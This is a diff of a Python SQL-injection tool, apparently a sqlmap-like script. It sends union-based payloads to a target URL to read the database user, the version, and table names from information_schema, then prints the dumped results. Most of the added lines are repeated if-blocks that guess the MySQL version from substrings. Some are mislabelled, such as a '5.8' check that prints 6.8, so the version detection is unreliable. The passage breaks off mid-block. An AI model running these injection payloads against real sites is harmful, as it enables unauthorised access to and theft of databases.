@@ -7,7 +7,7 @@ import os
 def banner():
     print('''
               ___
- _____         H  _____     _ _  {3.1.5}
+ _____         H  _____     _ _  {1.1.5}
 |  |  |___ ___[,]|   __|___| |_| 
 |  |  | .'|  _[(]|__   | . | | | {Pham Chien}
  \___/|__,|_| [)]|_____|_  |_|_|
@@ -138,11 +138,441 @@ if target_url:
                                         results_get_ver = requests.get(target_url + version_payload)
                                         print("back-end MySQL: ")
                                         if "ubuntu" in results_get_ver.text:
-                                            print("web server operating system : Linux Ubuntu")
+                                          print("web server operating system : Linux Ubuntu")
+                                          if "5.0" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.0")
+                                          if "5.0.12" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.0.12 ")
+                                          if "5.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.1 ")
+                                          if "5.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.2 ")
+                                          if "5.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.3 ")
+                                          if "5.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.4 ")
+                                          if "5.5" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.5 ")
+                                          if "5.6" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.6")
+                                          if "5.7" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.7 ")
+                                          if "5.8" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.8 ")
+                                          if "5.9" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.9 ")
+                                          if "5.10" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.10 ")
+                                          if "6.0" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.0 ")
+                                          if "6.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.1 ")
+                                          if "6.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.2 ")
+                                          if "6.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.3 ")
+                                          if "6.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.4 ")
+                                          if "6.5" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.5 ")
+                                          if "6.6" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.6 ")
+                                          if "6.7" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.7 ")
+                                          if "5.8" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.8 ")
+                                          if "5.9" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.9 ")
+                                          if "6.10" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.10 ")
+                                          if "7.0" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.0 ")
+                                          if "7.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.1 ")
+                                          if "7.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.2 ")
+                                          if "7.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.3 ")
+                                          if "7.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.4  ")
+                                          if "7.5" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.5  ")
+                                          if "7.6" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.6 ")
+                                          if "7.7" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.7  ")
+                                          if "7.8" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.8  ")
+                                          if "7.9" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.9  ")
+                                          if "7.10" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.10  ")
+                                          if "8.0" in results_get_ver.text:
+                                            print("web server operating version : MySQL >=  8.0")
+                                          if "8.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.1 ")
+                                          if "8.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.2 ")
+                                          if "8.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.3")
+                                          if "8.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.4 ")
+                                          if "8.5" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.5 ")
+                                          if "8.6" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.6 ")
+                                          if "8.7" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.7 ")
+                                          if "8.8" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.8 ")
+                                          if "8.9" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.9 ")
+                                          if "8.10" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.10 ")
+                                          if "9.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.1 ")
+                                          if "9.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.2 ")
+                                          if "9.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.3 ")
+                                          if "9.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.4 ")
+                                          if "9.5" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.5 ")
+                                          if "9.6" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.6 ")
+                                          if "9.7" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.7 ")
+                                          if "9.8" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.8 ")
+                                          if "9.9" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.9 ")
+                                          if "9.10" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.10 ")
+                                          if "10.0" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.0 ")
+                                          if "10.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.1 ")
+                                          if "10.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.2 ")
+                                          if "10.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.3 ")
+                                          if "10.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.4 ")
+                                          if "10.5" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.5 ")
+                                          if "10.6" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.6 ")
+                                          if "10.7" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.7 ")
+                                          if "10.8" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.8 ")
+                                          if "10.9" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.9 ")
+                                          if "10.10" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.10 ")
+                                          if "11.0" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 11.0 ")
+                                          if "11.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 11.1 ")
+                                          if "11.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 11.2 ")
+                                          if "11.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 11.3 ")
+                                          if "11.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 11.4 ")
+
                                         if "cll-lve" in results_get_ver.text:
-                                            print("web server operating system : Linux cll-lve")
+                                          print("web server operating system : Linux cll-lve")
+                                          if "5.0" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.0")
+                                          if "5.0.12" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.0.12 ")
+                                          if "5.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.1 ")
+                                          if "5.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.2 ")
+                                          if "5.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.3 ")
+                                          if "5.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.4 ")
+                                          if "5.5" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.5 ")
+                                          if "5.6" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.6")
+                                          if "5.7" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.7 ")
+                                          if "5.8" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.8 ")
+                                          if "5.9" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.9 ")
+                                          if "5.10" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.10 ")
+                                          if "6.0" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.0 ")
+                                          if "6.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.1 ")
+                                          if "6.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.2 ")
+                                          if "6.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.3 ")
+                                          if "6.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.4 ")
+                                          if "6.5" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.5 ")
+                                          if "6.6" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.6 ")
+                                          if "6.7" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.7 ")
+                                          if "5.8" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.8 ")
+                                          if "5.9" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.9 ")
+                                          if "6.10" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.10 ")
+                                          if "7.0" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.0 ")
+                                          if "7.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.1 ")
+                                          if "7.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.2 ")
+                                          if "7.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.3 ")
+                                          if "7.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.4  ")
+                                          if "7.5" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.5  ")
+                                          if "7.6" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.6 ")
+                                          if "7.7" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.7  ")
+                                          if "7.8" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.8  ")
+                                          if "7.9" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.9  ")
+                                          if "7.10" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.10  ")
+                                          if "8.0" in results_get_ver.text:
+                                            print("web server operating version : MySQL >=  8.0")
+                                          if "8.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.1 ")
+                                          if "8.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.2 ")
+                                          if "8.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.3")
+                                          if "8.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.4 ")
+                                          if "8.5" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.5 ")
+                                          if "8.6" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.6 ")
+                                          if "8.7" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.7 ")
+                                          if "8.8" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.8 ")
+                                          if "8.9" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.9 ")
+                                          if "8.10" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.10 ")
+                                          if "9.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.1 ")
+                                          if "9.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.2 ")
+                                          if "9.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.3 ")
+                                          if "9.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.4 ")
+                                          if "9.5" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.5 ")
+                                          if "9.6" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.6 ")
+                                          if "9.7" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.7 ")
+                                          if "9.8" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.8 ")
+                                          if "9.9" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.9 ")
+                                          if "9.10" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.10 ")
+                                          if "10.0" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.0 ")
+                                          if "10.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.1 ")
+                                          if "10.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.2 ")
+                                          if "10.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.3 ")
+                                          if "10.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.4 ")
+                                          if "10.5" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.5 ")
+                                          if "10.6" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.6 ")
+                                          if "10.7" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.7 ")
+                                          if "10.8" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.8 ")
+                                          if "10.9" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.9 ")
+                                          if "10.10" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.10 ")
+                                          if "11.0" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 11.0 ")
+                                          if "11.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 11.1 ")
+                                          if "11.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 11.2 ")
+                                          if "11.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 11.3 ")
+                                          if "11.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 11.4 ")
+
                                         if "MariaDB" in results_get_ver.text:
-                                            print("web server operating system : MariaDB")
+                                          print("web server operating system : Linux MariaDB")
+                                          if "5.0" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.0")
+                                          if "5.0.12" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.0.12 ")
+                                          if "5.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.1 ")
+                                          if "5.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.2 ")
+                                          if "5.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.3 ")
+                                          if "5.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.4 ")
+                                          if "5.5" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.5 ")
+                                          if "5.6" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.6")
+                                          if "5.7" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.7 ")
+                                          if "5.8" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.8 ")
+                                          if "5.9" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.9 ")
+                                          if "5.10" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.10 ")
+                                          if "6.0" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.0 ")
+                                          if "6.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.1 ")
+                                          if "6.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.2 ")
+                                          if "6.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.3 ")
+                                          if "6.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.4 ")
+                                          if "6.5" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.5 ")
+                                          if "6.6" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.6 ")
+                                          if "6.7" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.7 ")
+                                          if "5.8" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.8 ")
+                                          if "5.9" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.9 ")
+                                          if "6.10" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.10 ")
+                                          if "7.0" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.0 ")
+                                          if "7.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.1 ")
+                                          if "7.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.2 ")
+                                          if "7.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.3 ")
+                                          if "7.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.4  ")
+                                          if "7.5" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.5  ")
+                                          if "7.6" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.6 ")
+                                          if "7.7" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.7  ")
+                                          if "7.8" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.8  ")
+                                          if "7.9" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.9  ")
+                                          if "7.10" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.10  ")
+                                          if "8.0" in results_get_ver.text:
+                                            print("web server operating version : MySQL >=  8.0")
+                                          if "8.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.1 ")
+                                          if "8.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.2 ")
+                                          if "8.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.3")
+                                          if "8.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.4 ")
+                                          if "8.5" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.5 ")
+                                          if "8.6" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.6 ")
+                                          if "8.7" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.7 ")
+                                          if "8.8" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.8 ")
+                                          if "8.9" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.9 ")
+                                          if "8.10" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.10 ")
+                                          if "9.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.1 ")
+                                          if "9.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.2 ")
+                                          if "9.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.3 ")
+                                          if "9.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.4 ")
+                                          if "9.5" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.5 ")
+                                          if "9.6" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.6 ")
+                                          if "9.7" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.7 ")
+                                          if "9.8" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.8 ")
+                                          if "9.9" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.9 ")
+                                          if "9.10" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.10 ")
+                                          if "10.0" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.0 ")
+                                          if "10.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.1 ")
+                                          if "10.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.2 ")
+                                          if "10.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.3 ")
+                                          if "10.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.4 ")
+                                          if "10.5" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.5 ")
+                                          if "10.6" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.6 ")
+                                          if "10.7" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.7 ")
+                                          if "10.8" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.8 ")
+                                          if "10.9" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.9 ")
+                                          if "10.10" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.10 ")
+                                          if "11.0" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 11.0 ")
+                                          if "11.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 11.1 ")
+                                          if "11.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 11.2 ")
+                                          if "11.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 11.3 ")
+                                          if "11.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 11.4 ")
+
+                                              
 
                                         print("[INFO] Starting Enumerate table name DBMS...")
                                         payload_2 = "(SELECT+GROUP_CONCAT(user(),'::',version()))"
@@ -171,7 +601,7 @@ if target_url:
                                         html_cont = results_get_queries.text
                                         dbms = r"\b\w+::\b\w+::\b"
                                         database_all = re.findall(dbms, html_cont)
-                                        print("Blind table name")
+                                        print("Blind tables name")
                                         print("Dump DBS : {}".format(dbs))
                                         print("------------------")
                                         print("| table | column |")
@@ -185,8 +615,22 @@ if target_url:
                                         dbms = r"\b\w+::\b\w+::\b"
                                         database_all = re.findall(dbms, html_cont)
                                         print("")
-                                        print("Blind table name")
+                                        print("Blind columns name")
                                         print("Dump DBS : information_schema")
+                                        print("------------------")
+                                        print("| table | column |")
+                                        print("------------------")
+                                        for database in database_all:
+                                            print("+", database)
+                                        payload_4 = "(SELECT+GROUP_CONCAT(table_name,'::',version()+SEPARATOR+'<br>')+FROM+information_schema.tables)"
+                                        rm = re.sub(r"\b{}\b".format(num_countss), payload_4, payload)
+                                        results_get_queries = requests.get(target_url + rm)
+                                        html_cont = results_get_queries.text
+                                        dbms = r"\b\w+::\b\w+::\b"
+                                        database_all = re.findall(dbms, html_cont)
+                                        print("")
+                                        print("Blind ALL table name")
+                                        print("Dump DBS : ALL")
                                         print("------------------")
                                         print("| table | column |")
                                         print("------------------")
@@ -194,7 +638,7 @@ if target_url:
                                             print("+", database)
                                         exit()
                                     else:
-                                        print("Testing count")
+                                        print("[INFO] Testing Count Columns : {}".format(num_countss))
                                     
 
 # =============================================================================================================================
@@ -304,11 +748,439 @@ if target_url:
                                         results_get_ver = requests.get(target_url + version_payload)
                                         print("back-end MySQL: ")
                                         if "ubuntu" in results_get_ver.text:
-                                            print("web server operating system : Linux Ubuntu")
+                                          print("web server operating system : Linux Ubuntu")
+                                          if "5.0" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.0")
+                                          if "5.0.12" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.0.12 ")
+                                          if "5.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.1 ")
+                                          if "5.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.2 ")
+                                          if "5.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.3 ")
+                                          if "5.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.4 ")
+                                          if "5.5" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.5 ")
+                                          if "5.6" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.6")
+                                          if "5.7" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.7 ")
+                                          if "5.8" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.8 ")
+                                          if "5.9" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.9 ")
+                                          if "5.10" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.10 ")
+                                          if "6.0" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.0 ")
+                                          if "6.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.1 ")
+                                          if "6.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.2 ")
+                                          if "6.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.3 ")
+                                          if "6.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.4 ")
+                                          if "6.5" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.5 ")
+                                          if "6.6" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.6 ")
+                                          if "6.7" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.7 ")
+                                          if "5.8" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.8 ")
+                                          if "5.9" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.9 ")
+                                          if "6.10" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.10 ")
+                                          if "7.0" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.0 ")
+                                          if "7.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.1 ")
+                                          if "7.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.2 ")
+                                          if "7.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.3 ")
+                                          if "7.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.4  ")
+                                          if "7.5" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.5  ")
+                                          if "7.6" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.6 ")
+                                          if "7.7" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.7  ")
+                                          if "7.8" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.8  ")
+                                          if "7.9" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.9  ")
+                                          if "7.10" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.10  ")
+                                          if "8.0" in results_get_ver.text:
+                                            print("web server operating version : MySQL >=  8.0")
+                                          if "8.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.1 ")
+                                          if "8.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.2 ")
+                                          if "8.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.3")
+                                          if "8.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.4 ")
+                                          if "8.5" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.5 ")
+                                          if "8.6" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.6 ")
+                                          if "8.7" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.7 ")
+                                          if "8.8" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.8 ")
+                                          if "8.9" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.9 ")
+                                          if "8.10" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.10 ")
+                                          if "9.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.1 ")
+                                          if "9.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.2 ")
+                                          if "9.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.3 ")
+                                          if "9.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.4 ")
+                                          if "9.5" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.5 ")
+                                          if "9.6" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.6 ")
+                                          if "9.7" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.7 ")
+                                          if "9.8" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.8 ")
+                                          if "9.9" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.9 ")
+                                          if "9.10" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.10 ")
+                                          if "10.0" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.0 ")
+                                          if "10.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.1 ")
+                                          if "10.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.2 ")
+                                          if "10.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.3 ")
+                                          if "10.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.4 ")
+                                          if "10.5" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.5 ")
+                                          if "10.6" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.6 ")
+                                          if "10.7" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.7 ")
+                                          if "10.8" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.8 ")
+                                          if "10.9" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.9 ")
+                                          if "10.10" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.10 ")
+                                          if "11.0" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 11.0 ")
+                                          if "11.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 11.1 ")
+                                          if "11.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 11.2 ")
+                                          if "11.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 11.3 ")
+                                          if "11.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 11.4 ")
+
                                         if "cll-lve" in results_get_ver.text:
-                                            print("web server operating system : Linux cll-lve")
+                                          print("web server operating system : Linux cll-lve")
+                                          if "5.0" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.0")
+                                          if "5.0.12" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.0.12 ")
+                                          if "5.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.1 ")
+                                          if "5.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.2 ")
+                                          if "5.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.3 ")
+                                          if "5.4" in results_get_ver.text:
